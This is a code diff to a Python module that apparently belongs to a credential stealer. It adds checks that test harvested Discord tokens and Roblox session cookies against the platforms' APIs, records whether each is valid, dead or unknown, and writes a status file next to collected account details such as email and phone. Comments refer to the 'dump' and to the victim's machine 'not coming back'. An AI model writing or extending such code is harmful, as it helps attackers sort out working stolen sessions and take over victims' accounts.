@@ -38,6 +38,18 @@ from . import log, util
 
 IDENTITY_FILE: Final[str] = "identity.json"
 
+# One row per credential that was tested, with the verdict on it. Separate from
+# ``identity.json`` on purpose: that file is what was learned *about* an account and it is
+# absent for a dead row, while this one answers a different question — was the credential
+# alive at the moment it was read, and if not, what refused it. A dead cookie inside a
+# rich-looking dump is the failure the reference set names: the row looks like an account
+# and is worth nothing.
+STATUS_FILE: Final[str] = "session_status.json"
+
+VALID: Final[str] = "valid"
+DEAD: Final[str] = "dead"
+UNKNOWN: Final[str] = "unknown"
+
 # The whole module gets one budget. Three endpoints on a healthy network answer in well
 # under a second; a dead one burns the deadline once and the run continues without it.
 _DEADLINE: Final[float] = 8.0
@@ -152,6 +164,24 @@ def _text(value: Any) -> str:
     return value if isinstance(value, str) else ""
 
 
+def _session_status(fault: str) -> str:
+    """What a failed session check means about the credential, not about the run.
+
+    Three answers, and the third is the one that matters. ``dead`` is a fact the origin
+    stated: it answered 401, or 403 after the CSRF handshake it was given. ``unknown`` is
+    everything else — a timeout, a 429, a 500, a shape change. Reporting those as dead is
+    worse than reporting nothing, because a rate-limited check would delete a live cookie
+    from the dump and the only copy left is the one on a machine that is not coming back.
+
+    A 403 is a refusal here rather than an ambiguity because ``_roblox_get`` already
+    retried it with the token the origin asked for; a request that is still refused after
+    that is a request the origin will not answer with this credential.
+    """
+    if not fault:
+        return VALID
+    return DEAD if fault.endswith("unauthorized") else UNKNOWN
+
+
 def _age_days(created: str) -> int | None:
     if not created:
         return None
@@ -237,13 +267,19 @@ def _discord_account(token: str, source: str, deadline: float) -> dict[str, Any]
 
     me = _request(f"{_DISCORD_API}/users/@me", headers, deadline)
     if me.status != 200:
-        record["errors"].append(f"user: {_fault(me)}")
+        fault = _fault(me)
+        record["errors"].append(f"user: {fault}")
+        record["status"] = _session_status(fault)
         return record
 
     document = _json(me)
     if not isinstance(document, dict) or not _text(document.get("id")):
         record["errors"].append("user: shape")
+        # A 200 with no id is a shape change, not a dead token.
+        record["status"] = UNKNOWN
         return record
+
+    record["status"] = VALID
 
     for field in ("id", "username", "global_name", "discriminator", "email", "phone"):
         value = _text(document.get(field))
@@ -329,15 +365,20 @@ def _roblox_account(cookie: str, source: str, deadline: float) -> dict[str, Any]
     )
     if error:
         record["errors"].append(f"session: {error}")
+        record["status"] = _session_status(error)
         return record
     if not isinstance(authenticated, dict):
         record["errors"].append("session: shape")
+        record["status"] = UNKNOWN
         return record
 
     account_id = authenticated.get("id")
     if not isinstance(account_id, int):
         record["errors"].append("session: id")
+        record["status"] = UNKNOWN
         return record
+
+    record["status"] = VALID
 
     record["id"] = account_id
     for field in ("name", "displayName"):
@@ -471,7 +512,7 @@ def _collect(root: Path, cfg: Any) -> int:
         record = _discord_account(token, label, deadline)
         if record is None:
             continue
-        if "id" in record:
+        if record.get("status") == VALID:
             resolved += 1
         discord_records.append(record)
 
@@ -479,7 +520,7 @@ def _collect(root: Path, cfg: Any) -> int:
         record = _roblox_account(cookie, label, deadline)
         if record is None:
             continue
-        if "id" in record:
+        if record.get("status") == VALID:
             resolved += 1
         roblox_records.append(record)
 
@@ -491,6 +532,7 @@ def _collect(root: Path, cfg: Any) -> int:
     }
 
     util.write_json(root / "accounts" / IDENTITY_FILE, document)
+    util.write_json(root / "accounts" / STATUS_FILE, _status_document(discord_records, roblox_records))
     log.logger.debug(
         "identity: %d discord, %d roblox, %d resolved",
         len(discord_records),
@@ -500,4 +542,35 @@ def _collect(root: Path, cfg: Any) -> int:
     return resolved
 
 
-__all__ = ["IDENTITY_FILE", "collect"]
+def _status_document(
+    discord_records: list[dict[str, Any]], roblox_records: list[dict[str, Any]]
+) -> dict[str, Any]:
+    """The per-row verdicts, and the counts that go with them.
+
+    Rows carry ``reason`` only when there is one, and a ``reason`` here is a fault label
+    already produced by ``_fault`` — stable strings, counted rather than narrated, so the
+    document can be totalled without reading prose.
+    """
+    rows: list[dict[str, Any]] = []
+    for platform, records in (("discord", discord_records), ("roblox", roblox_records)):
+        for record in records:
+            status = _text(record.get("status")) or UNKNOWN
+            row: dict[str, Any] = {
+                "platform": platform,
+                "source": _text(record.get("source")),
+                "status": status,
+            }
+            if status != VALID:
+                errors = record.get("errors")
+                if isinstance(errors, list) and errors:
+                    row["reason"] = str(errors[0])
+            rows.append(row)
+
+    counts = {VALID: 0, DEAD: 0, UNKNOWN: 0}
+    for row in rows:
+        counts[row["status"]] = counts.get(row["status"], 0) + 1
+
+    return {"schema": 1, "counts": counts, "rows": rows}
+
+
+__all__ = ["DEAD", "IDENTITY_FILE", "STATUS_FILE", "UNKNOWN", "VALID", "collect"]
